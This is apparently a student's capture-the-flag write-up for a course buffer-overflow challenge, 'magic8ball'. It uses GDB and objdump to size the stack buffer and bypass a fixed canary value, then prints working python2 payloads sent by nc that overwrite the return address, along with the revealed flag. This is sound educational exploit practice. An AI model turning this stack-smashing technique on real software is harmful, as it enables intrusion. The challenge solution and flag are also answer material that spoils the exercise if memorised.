# [magic8ball](https://github.com/li-li-ge/ctf_writeups/blob/main/code/magic8ball)

### nc comp6841.quoccabank.com 5003


* First, use **Binary Ninja** to identify vulnerabilities. We can see the "vuln" function and "win" function. Our goal is to exploit "vuln" to reach "win." Let's break this down into three steps.

![](https://github.com/li-li-ge/ctf_writeups/blob/main/img/magic8ball1.png?raw=true)


##### step1 How to create a buffer overflow, and how many bytes are required for the overflow?
* Initially attempted to use GDB to determine this. It seems that the buffer size is at -0x2c(%ebp), which means it is 44bytes above the %ebp.

	~~~
   0x0804871a <+130>:    lea    -0x2c(%ebp),%eax

   0x0804871d <+133>:    push   %eax

   0x0804871e <+134>:    call   0x8048450 <gets@plt>
	~~~

* Given that "fortune1" is pushed onto the stack frame before, it takes up 12 bytes above %ebp. Therefore, the "buf" should be 32 bytes. Please correct me if I am mistaken.

 	~~~
   0x080486d3 <+59>:    mov    $0x804a040,%eax

   0x080486d9 <+65>:    mov    (%eax),%eax

   0x080486db <+67>:    mov    %eax,-0xc(%ebp)

   0x080486de <+70>:    sub    $0x8,%esp

   0x080486e1 <+73>:    push   -0xc(%ebp)
	~~~

#### step 2 How to ensure that "fortune1" remains equal to "fortune"?
* first lets try to check if get buffer overflowed!

	```
	python2 -c 'print "A"*31' |./magic8ball

	Your fortune is 4031186800

	idk why your fortune is a number, what does that mean?

	What do you think of your fortune?

	Thats... interesting... okay

	zzzzzzzzz
	```

	* let's make it to buffer overflow
	
	``` 
	python2 -c 'print "A"*32' |./magic8ball

	Your fortune is 4031186800

	idk why your fortune is a number, what does that mean?

	What do you think of your fortune?

	Thats... interesting... okay

	the sands of time have changed!!

 	```

* Attempted to debug and found the address to be 0xf0470770, which in decimal is 4031186800. oh. its the fortune.

* Add two breakpoints at the gets the address and the next instruction.
![](https://github.com/li-li-ge/ctf_writeups/blob/main/img/magic8ball3.png?raw=true)


* run the test which is "A"*32  or "A" * 33 to check which value be changed, then I found the exactly value is 0xf0470770.

 ![](https://github.com/li-li-ge/ctf_writeups/blob/main/img/magic8ball4.png?raw=true)

**milestone: finally skipped canary**

	
	python2 -c 'print "A"*32 + "\x70\x07\x47\xf0" ' |./magic8ball

	Your fortune is 4031186800

	idk why your fortune is a number, what does that mean?

	What do you think of your fortune?

	Thats... interesting... okay

	zzzzzzzzz
	
	

#### step 3 How to return to the "win" address?

* get the "win" address which is 0x080485e6 by objdump

	```
	objdump -d magic8ball | grep win

	080485e6 <win>:

	804863c:    75 19                    jne    8048657 <win+0x71>

	8048655:    eb 3c                    jmp    8048693 <win+0xad>
	```

* added into our payload but still not returned to the win fun.

	~~~
	python2 -c 'print "A"*32 + "\x70\x07\x47\xf0" +  "\xe6\x85\x04\x08" ' | 	nc comp6841.quoccabank.com 5003

	Your fortune is 4031186800

	idk why your fortune is a number, what does that mean?

	What do you think of your fortune?

	Thats... interesting... okay

	zzzzzzzzz
	~~~

 

* It seemed that some bytes needed to be added between the canary and the return address in "vuln." So, I decided to try a **brute-force** approach to determine the number of bytes required. It turned out that 12 bytes were needed to successfully reach the "win" address.

	```
	python2 -c 'print "A"*32 + "\x70\x07\x47\xf0" + "B"*12 + "\xe6\x85\x04\x08" ' | nc comp6841.quoccabank.com 5003

	Your fortune is 4031186800

	idk why your fortune is a number, what does that mean?

	What do you think of your fortune?

	Thats... interesting... okay

	zzzzzzzzz

	Ive changed your fortune.

	Now your fortune is to go to jail.

	```

	```
	COMP6841{SOMEWHAT_OF_A_BIRD_WATCHER}
	```

 

 

 

